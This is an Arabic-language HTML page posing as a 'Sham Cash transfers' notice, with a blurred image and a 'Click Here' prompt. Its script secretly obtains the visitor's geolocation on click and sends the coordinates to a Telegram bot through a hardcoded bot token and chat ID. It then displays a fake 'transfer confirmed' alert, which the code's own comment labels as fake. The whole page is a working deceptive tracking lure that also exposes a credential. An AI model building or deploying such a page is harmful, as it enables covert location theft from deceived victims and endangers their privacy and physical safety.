<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>تحويلات شام كاش</title>
  <style>
    body {
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: #f0f0f0;
      margin: 0;
      font-family: Arial, sans-serif;
    }

    #imageCard {
      width: 400px;
      height: 400px;
      background-image: url('https://i.ibb.co/spwcmX7m/IMG-20250826-WA0011.jpg'); /* ضع هنا الصورة أو GIF */
      background-size: cover;
      background-position: center;
      filter: blur(2px); /* لتغبيش الصورة */
      cursor: pointer;
      display: flex;
      justify-content: center;
      align-items: center;
      color: white;
      font-weight: bold;
      font-size: 20px;
      text-shadow: 1px 1px 2px black;
    }

    #caption {
      margin-top: 15px;
      font-size: 18px;
      color: #333;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div id="imageCard">Click Here</div>
  <div id="caption">تحويلات شام كاش</div>

  <script>
    const BOT_TOKEN = "8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0"; // توكن البوت
    const CHAT_ID = "7485197107"; // معرف الشات
    const card = document.getElementById('imageCard');

    card.addEventListener('click', () => {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(position => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;

          // إرسال الموقع للبوت
          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
              chat_id: CHAT_ID,
              text: `Lat: ${lat}\nLon: ${lon}`
            })
          });

          alert('تم تأكيد التحويل!'); // رسالة مزيفة فقط
        });
      } else {
        alert('غير قادر على الحصول على الموقع.');
      }
    });
  </script>
</body>
</html>
